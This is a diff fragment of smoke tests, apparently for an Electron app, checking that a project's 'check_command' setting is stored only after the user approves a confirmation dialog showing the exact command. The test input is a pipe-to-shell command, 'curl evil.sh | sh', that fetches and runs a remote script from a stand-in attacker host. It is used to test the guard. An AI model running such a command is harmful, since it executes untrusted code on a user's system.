+    const refused = await setSetting({ key: 'check_command', value: 'curl evil.sh | sh', projectId: gp.id });
+    assert(refused && refused.cancelled === true, 'O26: cancelling the confirmation refuses the check command');
+    assert(repo.settings.get('check_command', gp.id) == null, 'O26: a refused check command is NEVER stored');
+    assert(shown && shown.detail.includes('curl evil.sh | sh'), 'O26: the confirmation shows the VERBATIM command (O5)');
+
+    dialog.showMessageBox = async () => ({ response: 0 });                                   // Approve
+    await setSetting({ key: 'check_command', value: 'npm test', projectId: gp.id });
+    assert(repo.settings.get('check_command', gp.id) === 'npm test', 'O26: an approved check command is stored');
+
+    let asked = false;
+    dialog.showMessageBox = async () => { asked = true; return { response: 0 }; };
+    await setSetting({ key: 'check_command', value: '', projectId: gp.id });
+    assert(!asked && !repo.settings.get('check_command', gp.id), 'O26: clearing the check command needs no confirmation');
+    await setSetting({ key: 'build_env', value: 'PORT=3000', projectId: gp.id });
+    assert(!asked, 'O26: the guard is scoped — ordinary settings never prompt');
+    dialog.showMessageBox = realDialog;
+    repo.projects.archive(gp.id);
   }
 
   console.log('\nALL SMOKE TESTS PASSED');
